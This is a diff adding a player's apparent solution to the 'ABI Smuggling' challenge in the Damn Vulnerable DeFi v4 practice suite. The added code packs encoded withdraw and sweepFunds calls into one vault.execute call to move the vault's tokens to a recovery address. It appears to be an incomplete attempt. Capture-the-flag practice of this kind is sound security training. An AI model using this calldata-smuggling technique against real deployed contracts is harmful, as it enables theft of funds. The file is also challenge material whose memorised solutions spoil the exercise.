@@ -2,7 +2,7 @@
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
 pragma solidity =0.8.25;
 
-import {Test, console} from "forge-std/Test.sol";
+import {Test, console, console2} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";
 
@@ -73,7 +73,25 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+        uint256 withdrawLimit = vault.WITHDRAWAL_LIMIT();
+        uint256 waitingPeriod = vault.WAITING_PERIOD();
+        uint256 length = VAULT_TOKEN_BALANCE / withdrawLimit;
+
+        // for(uint256 i; i<length; i++){
+        //     vm.warp(block.timestamp + waitingPeriod + 10);
+        //     bytes memory actionData = abi.encodeCall(SelfAuthorizedVault.withdraw , (address(token), recovery, withdrawLimit));
+        //     vault.execute(address(vault), actionData);
+        // }
+
+        IERC20 _token = IERC20(address(token));
+
+        vm.warp(block.timestamp + waitingPeriod + 10);
+        bytes memory actionData1 = abi.encodeCall(SelfAuthorizedVault.withdraw , (address(token), recovery, 0));
+        bytes memory actionData2 = abi.encodeCall(SelfAuthorizedVault.sweepFunds, (recovery, _token));
+
+        bytes memory act = abi.encodePacked(actionData1, actionData2);
+
+        vault.execute(address(vault), act);
     }
 
     /**
